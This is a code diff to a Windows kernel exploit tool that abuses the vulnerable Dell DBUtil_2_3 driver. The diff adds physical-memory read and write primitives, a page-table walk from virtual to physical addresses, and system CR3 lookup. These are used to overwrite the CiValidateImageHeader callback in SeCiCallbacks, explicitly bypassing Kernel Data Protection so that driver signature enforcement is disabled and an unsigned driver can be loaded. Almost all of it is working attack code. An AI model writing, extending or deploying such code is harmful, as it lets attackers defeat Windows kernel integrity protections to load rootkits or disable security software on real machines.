@@ -13,7 +13,9 @@
 #define DBUTIL_DEVICE_NAME		L"\\Device\\DBUtil_2_3"
 #define IOCTL_DBUTIL			0x9B0C1EC4
 
-// DBUtil virtual memory operations
+// DBUtil memory operations
+#define DBUTIL_READ_PHYSICAL	0
+#define DBUTIL_WRITE_PHYSICAL	1
 #define DBUTIL_READ_VIRTUAL		2
 #define DBUTIL_WRITE_VIRTUAL	3
 
@@ -21,8 +23,8 @@
 typedef struct _DBUTIL_IO_REQUEST
 {
 	ULONG64 Pad0;
-	ULONG64 Operation;		// 2 = read virtual, 3 = write virtual
-	ULONG64 Address;		// kernel virtual address
+	ULONG64 Operation;		// 0=phys read, 1=phys write, 2=virt read, 3=virt write
+	ULONG64 Address;		// virtual or physical address depending on operation
 	ULONG64 Pad1;
 	ULONG64 Buffer;		// user-mode buffer pointer
 	ULONG64 Size;			// size in bytes
@@ -32,6 +34,7 @@ struct seCiCallbacks_swap
 {
 	DWORD64 ciValidateImageHeaderEntry;
 	DWORD64 zwFlushInstructionCache;
+	DWORD64 kPsInitialSystemProcess;	// kernel addr of PsInitialSystemProcess for CR3 lookup
 };
 
 static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
@@ -363,7 +366,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	if (kModuleBase == 0)
 	{
 		Printf(L"[!] Failed to find ntoskrnl.exe kernel base address\n");
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 	Printf(L"[*] Kernel ntoskrnl base : %p\n", kModuleBase);
 
@@ -372,7 +375,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	if (uNt == NULL)
 	{
 		Printf(L"[!] Failed to load ntoskrnl.exe into usermode\n");
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 	DWORD64 uNtAddr = (DWORD64)uNt;
 
@@ -382,7 +385,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	{
 		Printf(L"[!] GetModuleInformation failed\n");
 		FreeLibrary(uNt);
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 	Printf(L"[*] Usermode ntoskrnl    : %p (size 0x%X)\n", uNtAddr, modinfo.SizeOfImage);
 
@@ -411,7 +414,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 		Printf(L"[!] Tried %d patterns + heuristic (R8/R9/RCX/RDX). Your Windows build may not be supported.\n", numPatterns);
 		Printf(L"[!] Please report your build number so support can be added.\n");
 		FreeLibrary(uNt);
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 
 	Printf(L"[*] LEA instr at         : %p\n", seCiCallbacksInstr);
@@ -426,7 +429,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 		Printf(L"[!] Resolved SeCiCallbacks address %p is outside ntoskrnl image [%p - %p]. Aborting.\n",
 			seCiCallbacksAddr, uNtAddr, uNtAddr + modinfo.SizeOfImage);
 		FreeLibrary(uNt);
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 
 	// Validate: in the usermode copy, SeCiCallbacks should be uninitialized (all zeros)
@@ -450,7 +453,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 			for (int i = 0; i < 6; i++)
 				Printf(L"     [+0x%02X] %016llX\n", i * 8, *(DWORD64*)(seCiCallbacksAddr + i * 8));
 			FreeLibrary(uNt);
-			return seCiCallbacks_swap{ 0, 0 };
+			return seCiCallbacks_swap{ 0, 0, 0 };
 		}
 	}
 
@@ -464,7 +467,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 		Printf(L"[!] SeCiCallbacks offset 0x%llX exceeds ntoskrnl size 0x%X. Aborting.\n",
 			KernelOffset, modinfo.SizeOfImage);
 		FreeLibrary(uNt);
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 
 	DWORD64 kernelAddress = kModuleBase + KernelOffset;
@@ -476,9 +479,16 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	{
 		Printf(L"[!] Failed to resolve ZwFlushInstructionCache export\n");
 		FreeLibrary(uNt);
-		return seCiCallbacks_swap{ 0, 0 };
+		return seCiCallbacks_swap{ 0, 0, 0 };
 	}
 	DWORD64 zwFlushInstructionCache = uZwFlush - uNtAddr + (DWORD64)kModuleBase;
+
+	// Resolve PsInitialSystemProcess for page table walk (needed for KDP-safe physical writes)
+	DWORD64 uPsInit = (DWORD64)GetProcAddress(uNt, "PsInitialSystemProcess");
+	DWORD64 kPsInit = 0;
+	if (uPsInit != 0)
+		kPsInit = uPsInit - uNtAddr + (DWORD64)kModuleBase;
+	Printf(L"[*] PsInitialSystemProcess: %p\n", kPsInit);
 
 	// CiValidateImageHeader entry is at offset 0x20 in the SeCiCallbacks struct
 	DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;
@@ -486,7 +496,8 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	FreeLibrary(uNt);
 	return seCiCallbacks_swap{
 		ciValidateImageHeaderEntry,
-		zwFlushInstructionCache
+		zwFlushInstructionCache,
+		kPsInit
 	};
 }
 
@@ -631,6 +642,120 @@ static NTSTATUS WriteKernelQword(HANDLE DeviceHandle, DWORD64 Address, DWORD64 V
 		IOCTL_DBUTIL,
 		&req, sizeof(req),
 		&req, sizeof(req));
+}
+
+// Read a QWORD from a physical address via DBUtil (MmMapIoSpace)
+static NTSTATUS ReadPhysicalQword(HANDLE DeviceHandle, DWORD64 PhysAddress, DWORD64* Value)
+{
+	DBUTIL_IO_REQUEST req = { 0 };
+	req.Operation = DBUTIL_READ_PHYSICAL;
+	req.Address = PhysAddress;
+	req.Buffer = (ULONG64)Value;
+	req.Size = sizeof(DWORD64);
+
+	IO_STATUS_BLOCK IoStatusBlock;
+	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+	return NtDeviceIoControlFile(DeviceHandle,
+		nullptr, nullptr, nullptr,
+		&IoStatusBlock,
+		IOCTL_DBUTIL,
+		&req, sizeof(req),
+		&req, sizeof(req));
+}
+
+// Write a QWORD to a physical address via DBUtil (MmMapIoSpace - bypasses KDP)
+static NTSTATUS WritePhysicalQword(HANDLE DeviceHandle, DWORD64 PhysAddress, DWORD64 Value)
+{
+	DBUTIL_IO_REQUEST req = { 0 };
+	req.Operation = DBUTIL_WRITE_PHYSICAL;
+	req.Address = PhysAddress;
+	req.Buffer = (ULONG64)&Value;
+	req.Size = sizeof(DWORD64);
+
+	IO_STATUS_BLOCK IoStatusBlock;
+	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+	return NtDeviceIoControlFile(DeviceHandle,
+		nullptr, nullptr, nullptr,
+		&IoStatusBlock,
+		IOCTL_DBUTIL,
+		&req, sizeof(req),
+		&req, sizeof(req));
+}
+
+// Translate a kernel virtual address to physical using 4-level page table walk.
+// DirectoryTableBase is the CR3 value (from EPROCESS.DirectoryTableBase).
+static NTSTATUS TranslateVirtualToPhysical(
+	HANDLE DeviceHandle,
+	DWORD64 DirectoryTableBase,
+	DWORD64 VirtualAddress,
+	DWORD64* PhysicalAddress)
+{
+	*PhysicalAddress = 0;
+
+	int pml4Idx = (int)((VirtualAddress >> 39) & 0x1FF);
+	int pdptIdx = (int)((VirtualAddress >> 30) & 0x1FF);
+	int pdIdx   = (int)((VirtualAddress >> 21) & 0x1FF);
+	int ptIdx   = (int)((VirtualAddress >> 12) & 0x1FF);
+	DWORD64 pageOffset = VirtualAddress & 0xFFF;
+	DWORD64 cr3 = DirectoryTableBase & ~0xFFFULL;
+
+	// Read PML4E
+	DWORD64 pml4e = 0;
+	NTSTATUS status = ReadPhysicalQword(DeviceHandle, cr3 + pml4Idx * 8, &pml4e);
+	if (!NT_SUCCESS(status)) return status;
+	if (!(pml4e & 1)) return STATUS_INVALID_ADDRESS; // Not present
+
+	// Read PDPTE
+	DWORD64 pdpte = 0;
+	status = ReadPhysicalQword(DeviceHandle, (pml4e & 0x0000FFFFFFFFF000ULL) + pdptIdx * 8, &pdpte);
+	if (!NT_SUCCESS(status)) return status;
+	if (!(pdpte & 1)) return STATUS_INVALID_ADDRESS;
+
+	// 1GB large page
+	if (pdpte & 0x80) {
+		*PhysicalAddress = (pdpte & 0x0000FFFFC0000000ULL) | (VirtualAddress & 0x3FFFFFFFULL);
+		return STATUS_SUCCESS;
+	}
+
+	// Read PDE
+	DWORD64 pde = 0;
+	status = ReadPhysicalQword(DeviceHandle, (pdpte & 0x0000FFFFFFFFF000ULL) + pdIdx * 8, &pde);
+	if (!NT_SUCCESS(status)) return status;
+	if (!(pde & 1)) return STATUS_INVALID_ADDRESS;
+
+	// 2MB large page
+	if (pde & 0x80) {
+		*PhysicalAddress = (pde & 0x0000FFFFFFE00000ULL) | (VirtualAddress & 0x1FFFFFULL);
+		return STATUS_SUCCESS;
+	}
+
+	// Read PTE (4KB page)
+	DWORD64 pte = 0;
+	status = ReadPhysicalQword(DeviceHandle, (pde & 0x0000FFFFFFFFF000ULL) + ptIdx * 8, &pte);
+	if (!NT_SUCCESS(status)) return status;
+	if (!(pte & 1)) return STATUS_INVALID_ADDRESS;
+
+	*PhysicalAddress = (pte & 0x0000FFFFFFFFF000ULL) | pageOffset;
+	return STATUS_SUCCESS;
+}
+
+// Write a QWORD to a kernel virtual address, bypassing KDP via physical memory.
+// Falls back to virtual write if physical translation fails.
+static NTSTATUS WriteKernelQwordKdpSafe(
+	HANDLE DeviceHandle,
+	DWORD64 DirectoryTableBase,
+	DWORD64 VirtualAddress,
+	DWORD64 Value)
+{
+	DWORD64 pa = 0;
+	NTSTATUS status = TranslateVirtualToPhysical(DeviceHandle, DirectoryTableBase, VirtualAddress, &pa);
+	if (!NT_SUCCESS(status))
+	{
+		Printf(L"[!] VA->PA translation failed for %p: %08X, falling back to virtual write\n", VirtualAddress, status);
+		return WriteKernelQword(DeviceHandle, VirtualAddress, Value);
+	}
+	Printf(L"[*] VA %p -> PA %p\n", VirtualAddress, pa);
+	return WritePhysicalQword(DeviceHandle, pa, Value);
 }
 
 
@@ -840,8 +965,39 @@ TriggerExploit(
 		}
 	}
 
+	// Get DirectoryTableBase (CR3) for KDP-safe physical writes.
+	// SeCiCallbacks is KDP-protected on Win11 23H2+, so virtual writes will BSOD.
+	// Physical writes via MmMapIoSpace bypass KDP page table protections.
+	DWORD64 dirTableBase = 0;
+	if (w.kPsInitialSystemProcess != 0)
+	{
+		DWORD64 systemEprocess = 0;
+		Status = ReadKernelQword(DeviceHandle, w.kPsInitialSystemProcess, &systemEprocess);
+		if (NT_SUCCESS(Status) && systemEprocess != 0)
+		{
+			// EPROCESS.DirectoryTableBase is at offset 0x28 on all x64 Windows versions
+			Status = ReadKernelQword(DeviceHandle, systemEprocess + 0x28, &dirTableBase);
+			if (NT_SUCCESS(Status))
+				Printf(L"[*] System CR3 (DirectoryTableBase): %p\n", dirTableBase);
+			else
+				Printf(L"[!] Failed to read DirectoryTableBase: %08X\n", Status);
+		}
+		else
+			Printf(L"[!] Failed to read PsInitialSystemProcess: %08X\n", Status);
+	}
+
+	if (dirTableBase == 0)
+	{
+		Printf(L"[!] Cannot resolve CR3 for physical write. KDP-protected systems will BSOD.\n");
+		Printf(L"[!] Aborting to be safe. Try running on a system without KDP/VBS.\n");
+		Status = STATUS_UNSUCCESSFUL;
+		goto Cleanup;
+	}
+
 	// Overwrite CiValidateImageHeader with ZwFlushInstructionCache (harmless stub)
-	Status = WriteKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, w.zwFlushInstructionCache);
+	// Uses physical memory write to bypass KDP page table protection
+	Printf(L"[*] Writing via physical memory (KDP bypass)...\n");
+	Status = WriteKernelQwordKdpSafe(DeviceHandle, dirTableBase, w.ciValidateImageHeaderEntry, w.zwFlushInstructionCache);
 	if (!NT_SUCCESS(Status))
 	{
 		Printf(L"[!] Write primitive (patch) failed: %08X\n", Status);
@@ -861,7 +1017,7 @@ TriggerExploit(
 
 	// ALWAYS restore the original callback, even if driver load failed
 	{
-		NTSTATUS RestoreStatus = WriteKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, originalCallback);
+		NTSTATUS RestoreStatus = WriteKernelQwordKdpSafe(DeviceHandle, dirTableBase, w.ciValidateImageHeaderEntry, originalCallback);
 		if (!NT_SUCCESS(RestoreStatus))
 			Printf(L"[!] CRITICAL: Failed to restore callback: %08X\n", RestoreStatus);
 		else
